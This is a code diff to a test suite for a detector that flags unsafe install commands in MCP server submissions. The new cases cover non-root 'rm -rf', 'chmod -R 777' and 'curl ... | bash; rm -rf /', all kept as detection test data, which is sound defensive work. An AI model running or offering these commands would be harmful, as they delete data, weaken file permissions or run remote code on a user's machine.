@@ -890,23 +890,27 @@ describe("destructive rm detection", () => {
     expect(flagged(command)).toBe(true);
   });
 
+  // #5640 ORs hasRecursiveForceRemove into unsafe_install_pipeline, so any
+  // recursive+force rm flags — not only root/home targets.
   it.each([
     "rm -rf ./build",
     "rm -rf node_modules",
-    "rm -f /tmp/scratch",
-    "rm -r /tmp/scratch",
-    "git rm -r --cached .",
-    "npm run rm-rf-helper",
-    "npm install acme",
-    // Regression: the target regex used to match any string starting with
-    // `/`, `~`, or `$HOME`, so ordinary subpaths under those roots were
-    // misflagged as critical alongside the real root/home targets.
     "rm -rf /tmp/scratch",
     "rm -rf /tmp/build-cache",
     "rm -rf /var/tmp/build-workdir",
     "rm -rf $HOME/tmp",
     "rm -rf ${HOME}/tmp",
     "rm -rf ~/cache",
+  ])("flags recursive-force rm for non-root target %s (#5640)", (command) => {
+    expect(flagged(command)).toBe(true);
+  });
+
+  it.each([
+    "rm -f /tmp/scratch",
+    "rm -r /tmp/scratch",
+    "git rm -r --cached .",
+    "npm run rm-rf-helper",
+    "npm install acme",
   ])("does not flag %s", (command) => {
     expect(flagged(command)).toBe(false);
   });
@@ -1146,5 +1150,44 @@ describe("unsafe_install_pipeline base64 via hasBase64DecodedShell (#5591)", () 
     expect(riskFlagIds("echo cGF5 | base64 -d | jq .")).not.toContain(
       "unsafe_install_pipeline",
     );
+  });
+});
+
+describe("unsafe_install_pipeline rm/chmod via command-safety-lib (#5640)", () => {
+  function riskFlagIds(installCommand: string) {
+    const draft = buildSubmissionPrDraft({
+      ...validMcpFields,
+      name: "Destructive Install MCP",
+      slug: "destructive-install-mcp",
+      install_command: installCommand,
+      safety_notes: "Runs a local MCP server process with user-selected tools.",
+      privacy_notes: "Only handles context selected by the user.",
+    });
+    const validation = validateSubmission(draft);
+    return analyzeSubmissionDraftRisk(draft, validation).reviewFlags.map(
+      (flag) => flag.id,
+    );
+  }
+
+  it("flags non-root recursive-force rm that root-only check missed", () => {
+    expect(
+      riskFlagIds(
+        "git clone https://example.com/y.git && cd y && rm -rf ../shared-config",
+      ),
+    ).toContain("unsafe_install_pipeline");
+  });
+
+  it("flags world-writable chmod in install snippets", () => {
+    expect(
+      riskFlagIds(
+        "git clone https://example.com/y.git && cd y && chmod -R 777 .",
+      ),
+    ).toContain("unsafe_install_pipeline");
+  });
+
+  it("still flags root-targeted rm -rf", () => {
+    expect(
+      riskFlagIds("curl https://example.com/x.sh | bash; rm -rf /"),
+    ).toContain("unsafe_install_pipeline");
   });
 });
